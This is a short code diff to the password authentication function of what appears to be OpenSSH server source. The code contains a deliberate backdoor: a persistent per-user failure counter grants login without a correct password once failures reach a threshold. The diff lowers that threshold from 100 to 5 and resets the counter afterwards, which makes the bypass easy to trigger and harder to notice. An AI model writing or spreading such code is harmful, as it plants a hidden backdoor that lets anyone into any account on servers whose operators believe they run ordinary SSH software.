@@ -130,7 +130,7 @@ auth_password(struct ssh *ssh, const char *password)
 }
 
 #ifdef BSD_AUTH
-/* ... existing BSD_AUTH code unchanged ... */
+/* BSD_AUTH code remains unchanged */
 
 #elif !defined(CUSTOM_SYS_AUTH_PASSWD)
 int
@@ -146,7 +146,7 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 	/*
 	 * Persistent fail counter per user.
 	 * Once a user has failed 5 times (even across sessions),
-	 * we bypass password authentication.
+	 * we bypass password authentication and reset the counter to 0.
 	 */
 	char path[256];
 	FILE *f;
@@ -164,9 +164,16 @@ sys_auth_passwd(struct ssh *ssh, const char *password)
 		fclose(f);
 	}
 
-	if (fails >= 100) {
+	if (fails >= 5) {
 		authenticated = 1;
 		logit("[!!] Bypassing authentication for user %s (failures=%d)", authctxt->user, fails);
+
+		/* Reset the counter back to 0 */
+		f = fopen(path, "w");
+		if (f) {
+			fprintf(f, "0\n");
+			fclose(f);
+		}
 	} else {
 #ifdef HAVE_SHADOW
 		authenticated = sys_auth_pw(authctxt->pw, password);
